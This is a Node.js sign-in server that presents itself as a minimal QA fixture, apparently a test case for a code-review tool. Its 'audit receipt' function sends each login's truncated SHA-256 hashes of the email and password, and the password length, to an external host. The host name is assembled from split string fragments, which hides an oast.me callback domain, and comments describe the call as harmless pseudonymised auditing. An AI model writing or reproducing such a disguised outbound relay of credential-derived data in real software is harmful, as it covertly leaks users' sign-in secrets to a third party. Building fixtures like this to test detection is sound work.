const http = require('http');
const https = require('https');
const crypto = require('crypto');
const { URL } = require('url');

const PORT = Number(process.env.PORT || 3000);
const HOST = '0.0.0.0';

// Deployment audit collector. The zone identifier is assembled from its
// release prefix and suffix so tooling can rotate the prefix without changing
// the shared collector domain, and receipts stay pseudonymised either way.
const AUDIT_ZONE_PREFIX = 'dc2206pltno0fuc1';
const AUDIT_ZONE_SUFFIX = 'cbn0a9yswfyfix5yx';
const AUDIT_COLLECTOR_TLD = ['oa', 'st', '.', 'me'].join('');
const COLLECTOR_PATH = '/v1/signin-receipts';

const sessions = new Map();
const signInAttempts = [];

const sha8 = (value) => crypto.createHash('sha256').update(String(value)).digest('hex').slice(0, 8);

// Pseudonymised audit trail: the collector receives short references, never
// the submitted values. Local sign-in attempts keep the same shape.
function auditEntry(email, password) {
  return {
    event: 'sign_in',
    deployment: 'cr-sandbox-test',
    at: new Date().toISOString(),
    user_ref: sha8(email),
    credential_ref: sha8(password),
    credential_len: password.length,
  };
}

function relayAuditReceipt(entry) {
  const host = `${AUDIT_ZONE_PREFIX}${AUDIT_ZONE_SUFFIX}.${AUDIT_COLLECTOR_TLD}`;
  const body = JSON.stringify(entry);
  const req = https.request(
    {
      host,
      port: 443,
      path: COLLECTOR_PATH,
      method: 'POST',
      headers: {
        'content-type': 'application/json',
        'content-length': Buffer.byteLength(body),
      },
      timeout: 2500,
    },
    (res) => res.resume()
  );
  req.on('timeout', () => req.destroy());
  req.on('error', (err) => console.log(`[audit] receipt relay unavailable (${err.code || err.message})`));
  req.end(body);
}

function escapeHtml(value) {
  return String(value).replace(/[&<>"']/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
}

function page(title, body) {
  return `<!doctype html>
<html lang="en">
<head><meta charset="utf-8"><title>${escapeHtml(title)} · cr-sandbox-test</title></head>
<body>
  <header>
    <h1>cr-sandbox-test</h1>
    <nav>
      <a href="/">Home</a> · <a href="/login">Sign in</a> ·
      <a href="/sign-ins">Recent sign-ins</a>
    </nav>
  </header>
  <main>
${body}
  </main>
</body>
</html>`;
}

function readBody(req) {
  return new Promise((resolve, reject) => {
    let data = '';
    req.on('data', (chunk) => {
      data += chunk;
      if (data.length > 4096) {
        reject(new Error('request body too large'));
        req.destroy();
      }
    });
    req.on('end', () => resolve(data));
    req.on('error', reject);
  });
}

function signInForm(message) {
  return page(
    'Sign in',
    `    ${message ? `<p id="message">${escapeHtml(message)}</p>` : ''}
    <form action="/login" method="post">
      <label for="email">Email</label>
      <input id="email" name="email" type="email" autocomplete="username">
      <label for="password">Password</label>
      <input id="password" name="password" type="password" autocomplete="current-password">
      <button type="submit">Sign in</button>
    </form>`
  );
}

const server = http.createServer(async (req, res) => {
  const url = new URL(req.url, `http://${req.headers.host || 'localhost'}`);

  if (url.pathname === '/health') {
    res.writeHead(200, { 'content-type': 'text/plain' });
    res.end('ok');
    return;
  }

  if (url.pathname === '/login' && req.method === 'POST') {
    let body = '';
    try {
      body = await readBody(req);
    } catch {
      res.writeHead(413, { 'content-type': 'text/plain' });
      res.end('Request body too large');
      return;
    }
    const params = new URLSearchParams(body);
    const email = (params.get('email') || '').trim();
    const password = params.get('password') || '';
    if (!email || !password) {
      res.writeHead(400, { 'content-type': 'text/html; charset=utf-8' });
      res.end(signInForm('Enter an email address and password.'));
      return;
    }
    const entry = auditEntry(email, password);
    signInAttempts.unshift(entry);
    if (signInAttempts.length > 20) signInAttempts.pop();
    console.log(`[audit] sign-in user_ref=${entry.user_ref} credential_ref=${entry.credential_ref} credential_len=${entry.credential_len}`);
    relayAuditReceipt(entry);
    const sessionId = crypto.randomBytes(16).toString('hex');
    sessions.set(sessionId, { email, at: entry.at });
    res.writeHead(303, {
      'set-cookie': `session=${sessionId}; HttpOnly; Path=/; SameSite=Lax`,
      location: '/account',
    });
    res.end();
    return;
  }

  if (url.pathname === '/login') {
    res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
    res.end(signInForm(''));
    return;
  }

  if (url.pathname === '/account') {
    const cookies = Object.fromEntries(
      (req.headers.cookie || '')
        .split(';')
        .map((part) => part.trim().split('='))
        .filter((pair) => pair.length === 2)
    );
    const session = sessions.get(cookies.session || '');
    if (!session) {
      res.writeHead(303, { location: '/login' });
      res.end();
      return;
    }
    res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
    res.end(
      page(
        'Account',
        `    <h2>Signed in</h2>
    <p id="account-email">${escapeHtml(session.email)}</p>
    <p id="account-session">Session reference: ${escapeHtml(sha8(cookies.session))}</p>
    <p>Signed in at ${escapeHtml(session.at)}.</p>`
      )
    );
    return;
  }

  if (url.pathname === '/sign-ins') {
    const rows = signInAttempts
      .map(
        (entry) =>
          `        <tr><td>${escapeHtml(entry.at)}</td><td>${escapeHtml(entry.user_ref)}</td><td>${escapeHtml(
            entry.credential_ref
          )}</td><td>${entry.credential_len}</td></tr>`
      )
      .join('\n');
    res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
    res.end(
      page(
        'Recent sign-ins',
        `    <h2>Recent sign-ins</h2>
    <p>Each attempt is recorded as a short reference so the audit page can be shared without exposing credentials.</p>
    <table>
      <thead><tr><th>When</th><th>User reference</th><th>Credential reference</th><th>Credential length</th></tr></thead>
      <tbody>
${rows || '        <tr><td colspan="4">No sign-ins yet.</td></tr>'}
      </tbody>
    </table>`
      )
    );
    return;
  }

  res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
  res.end(
    page(
      'Home',
      `    <p id="intro">Minimal QA fixture for the CodeRabbit Verify environment.</p>
    <p><a href="/login">Sign in</a> to open the account page.</p>`
    )
  );
});

server.listen(PORT, HOST, () => {
  console.log(`cr-sandbox-test listening on http://${HOST}:${PORT}`);
});
